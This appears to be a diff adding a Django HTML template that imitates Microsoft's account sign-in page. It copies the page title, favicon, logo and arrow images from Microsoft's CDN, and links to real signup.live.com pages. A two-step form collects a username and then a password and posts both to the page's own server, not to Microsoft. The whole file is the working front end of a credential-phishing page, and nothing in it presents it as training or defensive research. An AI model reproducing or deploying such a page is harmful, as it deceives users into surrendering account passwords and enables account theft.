@@ -1,0 +1,222 @@
+{% load static%}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29498.2/images/favicon.ico">
+    <link rel="stylesheet" href="{% static 'main.css' %}">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
+    <link rel="stylesheet" href="{% static 'hover.css' %}">
+   <style>
+        body{
+            background-image: url({% static "microsoftbg.png" %});
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        #div1{
+            margin-left: 450px;
+            margin-top: 80px;
+            width: 460px;
+            background-color: #ffffff;
+            padding-left: 50px;
+            padding-top: 30px;
+            padding-bottom: 60px;
+        }
+        #img1{
+            min-width: 100px;
+        }
+        #p1{
+            font-size: 30px;
+            font-weight: bold;
+            margin-top: -10px;
+        }
+        #textbox{
+            border: 1px solid #ffffff;
+            font-size: 18px;
+        }
+        hr{
+            width: 400px;
+            margin-right: 100px;
+            margin-bottom: 17px;
+        }
+        #label1{
+            color: #1b1b1b;
+            font-size: 17px;
+        }
+        #a1{
+            color: #108df3;
+            text-decoration: none;
+            font-size: 17px;
+        }
+        #a1:hover{
+            text-decoration: underline;
+            color: #666666;
+
+        }
+        #a2{
+            font-size: 17px;
+            text-decoration: none;
+            color: #108df3;
+            float: left;
+            margin-right: 0px;
+        }
+        #a2:hover{
+            text-decoration: underline;
+            color: #666666;
+        }
+        #a3{
+            float: left;
+            margin-left: -10px;
+        }
+        #img2{
+            width: 43px;
+            
+        }
+        #submit{
+            width: 120px;
+            background-color: #005da6;
+            color: white;
+            font-size: 18px;
+            padding: 7px;
+            border: 1px solid #005da6;
+            margin-left: 296px;
+            margin-top: 15px;
+            opacity: 0.9;
+        }
+        #submit:hover{
+            cursor: pointer;
+            opacity: 1;
+        }
+        #div2{
+            margin-left: 450px;
+            height: 60px;
+            margin-top: 22px;
+        }
+        #img3{
+            width: 45px;
+            float: left;
+            margin-left: 50px;
+        }
+        #label2{
+            font-size: 19px;
+            float: left;
+            margin-top: 19px;
+        }
+        #button1{
+            background-color: #ffffff;
+            border: 1px solid #ffffff;
+            width: 510px;
+        }
+        #button1:hover{
+            cursor: pointer;
+            background-color: #e5e5e5;
+            border: 1px solid #e5e5e5;
+        }
+        #div3{
+            margin-top: 70px;
+            margin-left: 1120px;
+        }
+        #a4{
+            color: black;
+            text-decoration: none;
+        }
+        #a4:hover{
+            text-decoration: underline;
+        }
+        #a5{
+            color: black;
+            margin-left: 20px;
+            text-decoration: none;
+        }
+        #a5:hover{
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+    <form action='' method='POST'>
+        {% csrf_token %}
+        <div class="row" id="log" style="margin-bottom: 16px;">
+                <div class="d-flex h-100 justify-content-center align-items-center p-0">
+                        <h1 class="card home-title container-fluid" style="padding: 40px;">
+                            <img id="img1" style="max-width: 110px; height: 24px;" class="" src="{% static 'microsoftlogo.png.svg' %}" alt="">
+                            <span> <p class="enter mt-3">Login</p> </span>
+                            {{form.log}}
+                            <span> <p class="nologin mt-2"  unselectable="on">No account?  <a class="aclick" href="https://signup.live.com/signup"> Create one!</a></p> </span>
+                        <div class="d-flex mb-2">
+                            <div class="ms-auto p-2"><button id="setbtn" class="but"> <p class="textinbut">Next</p></button></div>
+                        </div>
+                        </h1>
+                </div>   
+            </div>
+            <div class="row" id="params">
+                <a href="" class="aclick text-black"><div class=" d-flex h-100 justify-content-center align-items-center p-0"><p class="card hover-shadow d-flex align-items-left expet justify-content-center ps-5">Sign-in options </p></div></a>
+            </div>
+                <div id="pass" >
+                        <h1 class="card home-title container-fluid" style="padding: 40px;">
+                            <img id="img1" style="max-width: 110px; height: 24px;" class="" src="{% static 'microsoftlogo.png.svg' %}" alt="">
+                            <div style="font-size: 0.9rem;" class="mt-2">
+                                <button class="btn" id="back">
+                                    <img pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
+                                </button>    
+                                mail.com
+                            </div>
+                            <span> <p class="enter mt-2"  unselectable="on" style="font-size: 1.3rem;" >Enter the password</p> </span>
+                            {{form.password}}                               
+                            <a class="nologin mt-4 aclick" href="https://signup.live.com/signup">Forgot your password?</a>
+                        <div class="d-flex mb-2">
+                            <div class="ms-auto p-2"><button id='buttn' class="but"> <p class="textinbut">Next</p> </button></div>
+                        </div>
+                        </h1>
+                </div> 
+            </div>
+    
+
+    </div>
+
+    </div>
+  </form>
+
+   
+
+    </div>
+    <script>
+        inp = document.getElementById('inp1');
+        btn = document.getElementById('setbtn');
+        pass = document.getElementById('pass')
+        btn.setAttribute('disable', true);
+        btnn = document.getElementById('buttn')
+
+        document.getElementById("pass").hidden = true;
+        inp.oninput = function(){
+        if (inp.value.length < 5){
+            btn.setAttribute('disable', true);
+        }else{
+            btn.removeAttribute('disable');
+        }
+        }
+        document.getElementById('setbtn').onclick = function(){
+            document.getElementById("log").hidden = true;
+            document.getElementById("params").hidden = true;
+            pass.removeAttribute('hidden');
+            btnn.setAttribute('type', 'submit')
+        }
+        
+        document.getElementById('back').onclick = function(){
+            document.getElementById("pass").hidden = true;
+            document.getElementById("log").removeAttribute('hidden');
+            document.getElementById("params").removeAttribute('hidden');
+            btnn.removeAttribute('type', 'submit')
+        }
+
+
+
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
+</body>
+</html>
